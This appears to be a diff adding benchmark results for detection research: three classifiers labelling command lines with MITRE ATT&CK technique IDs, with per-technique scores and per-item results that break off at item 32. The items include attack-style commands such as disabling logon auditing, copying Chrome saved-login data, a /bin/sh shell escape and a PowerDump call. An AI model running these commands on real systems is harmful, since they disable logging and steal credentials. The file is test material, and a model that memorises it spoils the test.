@@ -1,0 +1,3830 @@
+{
+  "n": 119,
+  "date": "2026-04-20 14:40:03",
+  "tfidf": {
+    "top1": 0.5126050420168067,
+    "top3": 0.6386554621848739,
+    "avg_ms": 88.35714285714286
+  },
+  "genos": {
+    "top1": 0.5210084033613446,
+    "top3": 0.6386554621848739,
+    "avg_ms": 134.5747899159664
+  },
+  "gpt54": {
+    "top1": 0.3949579831932773,
+    "avg_ms": 917.9201680672269
+  },
+  "per_technique": {
+    "T1562": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1112": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1005": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1040": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1574": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1543": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1140": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1132": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1480": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1555": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1560": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1124": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1069": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1071": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1027": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1127": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1036": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1059": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1547": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1222": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1548": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1558": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1505": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1106": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1016": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1566": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1219": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1070": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1218": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1105": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1087": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1003": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1204": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1053": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1491": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1055": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1012": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1134": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1546": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1556": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1018": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1486": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1083": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1078": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1539": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1485": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1114": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1614": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1528": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1041": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1098": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1564": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1001": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1217": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1137": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1074": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1082": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1136": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1056": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1529": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1046": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1201": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1037": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1021": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1559": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1135": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1057": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1007": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1553": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1619": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1202": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1047": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1518": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1622": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1113": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1216": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1567": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1550": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1048": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1090": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1680": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1119": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1049": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1482": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1552": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1611": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1033": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1569": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1129": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1497": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1489": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1115": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1110": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1484": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1526": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1573": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1490": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1620": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1205": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1554": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1220": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1531": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1570": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1580": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1530": {
+      "n": 1,
+      "tf": 0,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1652": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 0
+    },
+    "T1006": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1010": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1025": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1039": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1072": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1120": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1123": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 1
+    },
+    "T1197": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1496": {
+      "n": 1,
+      "tf": 1,
+      "g": 1,
+      "gpt": 1
+    },
+    "T1561": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1609": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1610": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    },
+    "T1613": {
+      "n": 1,
+      "tf": 0,
+      "g": 0,
+      "gpt": 0
+    }
+  },
+  "results": [
+    {
+      "id": 1,
+      "gt": "T1562",
+      "command": "auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable",
+      "tfidf_top3": [
+        "T1562",
+        "T1070",
+        "T1056"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1562",
+        "T1070",
+        "T1056"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1562",
+        "T1070",
+        "T1112"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 2,
+      "gt": "T1112",
+      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f",
+      "tfidf_top3": [
+        "T1112",
+        "T1564",
+        "T1012"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1112",
+        "T1564",
+        "T1012"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1112",
+        "T1112",
+        "T1562"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 3,
+      "gt": "T1005",
+      "command": "ntpdate -a x -k /path/to/input-file -d localhost",
+      "tfidf_top3": [
+        "T1005",
+        "T1222",
+        "T1105"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1005",
+        "T1222",
+        "T1105"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1071",
+        "T1090",
+        "T1041"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 4,
+      "gt": "T1040",
+      "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i $interface -c 5",
+      "tfidf_top3": [
+        "T1040",
+        "T1135",
+        "T1202"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1040",
+        "T1135",
+        "T1202"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1040",
+        "T1059",
+        "T1562"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 5,
+      "gt": "T1574",
+      "command": "readdir",
+      "tfidf_top3": [
+        "T1083",
+        "T1106",
+        "T1574"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1083",
+        "T1106",
+        "T1574"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1083",
+        "T1106",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 6,
+      "gt": "T1543",
+      "command": "echo \"ExecStart=$execstart_action\" >> $systemd_service_path/$systemd_service_file",
+      "tfidf_top3": [
+        "T1543",
+        "T1087",
+        "T1680"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1543",
+        "T1087",
+        "T1680"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1543",
+        "T1059",
+        "T1574"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 7,
+      "gt": "T1140",
+      "command": "echo $ENCODED > $encoded_file && cat < $encoded_file | xxd -r -p",
+      "tfidf_top3": [
+        "T1140",
+        "T1059",
+        "T1678"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1140",
+        "T1059",
+        "T1678"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1140",
+        "T1059",
+        "T1027"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 8,
+      "gt": "T1132",
+      "command": "zlib",
+      "tfidf_top3": [
+        "T1129",
+        "T1027",
+        "T1546"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1129",
+        "T1027",
+        "T1546"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1027",
+        "T1140",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 9,
+      "gt": "T1480",
+      "command": "{12d61a41-4b74-7610-a4d8-3028d2f56395}",
+      "tfidf_top3": [
+        "T1071",
+        "T1480",
+        "T1036"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1071",
+        "T1480",
+        "T1036"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1027",
+        "T1036",
+        "T1140"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 10,
+      "gt": "T1555",
+      "command": "cp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"",
+      "tfidf_top3": [
+        "T1555",
+        "T1562",
+        "T1098"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1555",
+        "T1562",
+        "T1098"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1555",
+        "T1005",
+        "T1074"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 11,
+      "gt": "T1560",
+      "command": "zip",
+      "tfidf_top3": [
+        "T1560",
+        "T1005",
+        "T1140"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1560",
+        "T1005",
+        "T1140"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1560",
+        "T1005",
+        "T1027"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 12,
+      "gt": "T1124",
+      "command": "net time \\\\$computer_name",
+      "tfidf_top3": [
+        "T1124",
+        "T1059",
+        "T1135"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1124",
+        "T1059",
+        "T1135"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1124",
+        "T1016",
+        "T1049"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 13,
+      "gt": "T1069",
+      "command": "az ad user get-member-groups",
+      "tfidf_top3": [
+        "T1069",
+        "T1087",
+        "T1078"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1069",
+        "T1087",
+        "T1078"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1069",
+        "T1087",
+        "T1526"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 14,
+      "gt": "T1071",
+      "command": "Set-Location \"PathToAtomicsFolder\"",
+      "tfidf_top3": [
+        "T1567",
+        "T1550",
+        "T1530"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1567",
+        "T1550",
+        "T1530"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1083",
+        "T1059",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 15,
+      "gt": "T1027",
+      "command": "HKLM\\SOFTWARE\\Plus",
+      "tfidf_top3": [
+        "T1652",
+        "T1012",
+        "T1027"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1652",
+        "T1012",
+        "T1027"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1112",
+        "T1012",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 16,
+      "gt": "T1127",
+      "command": "csc.exe -out:{PATH:.exe} {PATH:.cs}",
+      "tfidf_top3": [
+        "T1127",
+        "T1202",
+        "T1218"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1127",
+        "T1202",
+        "T1218"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1127",
+        "T1059",
+        "T1027"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 17,
+      "gt": "T1036",
+      "command": "System.Console.WriteLine(\"tweet, tweet\");",
+      "tfidf_top3": [
+        "T1059",
+        "T1562",
+        "T1222"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1562",
+        "T1222"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1127",
+        "T1059",
+        "T1027"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 18,
+      "gt": "T1059",
+      "command": "echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file",
+      "tfidf_top3": [
+        "T1059",
+        "T1222",
+        "T1548"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1059",
+        "T1222",
+        "T1548"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1053",
+        "T1059",
+        "T1543"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 19,
+      "gt": "T1547",
+      "command": "HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "tfidf_top3": [
+        "T1547",
+        "T1027",
+        "T1012"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1547",
+        "T1027",
+        "T1012"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1547",
+        "T1112",
+        "T1060"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 20,
+      "gt": "T1222",
+      "command": "exiftool \"-description<=/path/to/input-file --filename /path/to/output-file",
+      "tfidf_top3": [
+        "T1005",
+        "T1222",
+        "T1105"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1005",
+        "T1222",
+        "T1105"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1564",
+        "T1027",
+        "T1036"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 21,
+      "gt": "T1548",
+      "command": "make /tmp/hello",
+      "tfidf_top3": [
+        "T1548",
+        "T1059",
+        "T1560"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1548",
+        "T1059",
+        "T1560"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1587",
+        "T1608",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 22,
+      "gt": "T1558",
+      "command": "echo End of Golden Ticket attack",
+      "tfidf_top3": [
+        "T1558",
+        "T1548",
+        "T1059"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1558",
+        "T1548",
+        "T1059"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1490",
+        "T1078",
+        "T1558"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 23,
+      "gt": "T1505",
+      "command": ".vgz",
+      "tfidf_top3": [
+        "T1059",
+        "T1614",
+        "T1140"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1614",
+        "T1140"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1564",
+        "T1036",
+        "T1027"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 24,
+      "gt": "T1106",
+      "command": "VirtualFree",
+      "tfidf_top3": [
+        "T1055",
+        "T1548",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1055",
+        "T1548",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1106",
+        "T1620",
+        "T1055"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 25,
+      "gt": "T1016",
+      "command": "foreach ($port in $ports) {",
+      "tfidf_top3": [
+        "T1046",
+        "T1546",
+        "T1049"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1046",
+        "T1546",
+        "T1049"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1021",
+        "T1046"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 26,
+      "gt": "T1566",
+      "command": "[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)",
+      "tfidf_top3": [
+        "T1566",
+        "T1562",
+        "T1059"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1566",
+        "T1562",
+        "T1059"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1113",
+        "T1115"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 27,
+      "gt": "T1219",
+      "command": "Start-Process $file1 /S;",
+      "tfidf_top3": [
+        "T1137",
+        "T1219",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1137",
+        "T1219",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1204",
+        "T1569"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 28,
+      "gt": "T1070",
+      "command": "cmd.exe /c del",
+      "tfidf_top3": [
+        "T1059",
+        "T1614",
+        "T1087"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1614",
+        "T1087"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1070",
+        "T1059",
+        "T1106"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 29,
+      "gt": "T1218",
+      "command": "Crash",
+      "tfidf_top3": [
+        "T1546",
+        "T1036",
+        "T1548"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1546",
+        "T1036",
+        "T1548"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1499",
+        "T1489",
+        "T1562"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 30,
+      "gt": "T1105",
+      "command": "rbc.close();",
+      "tfidf_top3": [
+        "T1105",
+        "T1222",
+        "T1558"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1105",
+        "T1222",
+        "T1558"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1106",
+        "T1027"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 31,
+      "gt": "T1087",
+      "command": "cmd.exe /c net user {Username}",
+      "tfidf_top3": [
+        "T1574",
+        "T1136",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1574",
+        "T1136",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1136",
+        "T1087",
+        "T1059"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 32,
+      "gt": "T1003",
+      "command": "Invoke-PowerDump",
+      "tfidf_top3": [
+        "T1003",
+        "T1059",
+        "T1555"
+      ],
+      "tfidf_top1_correct": true,
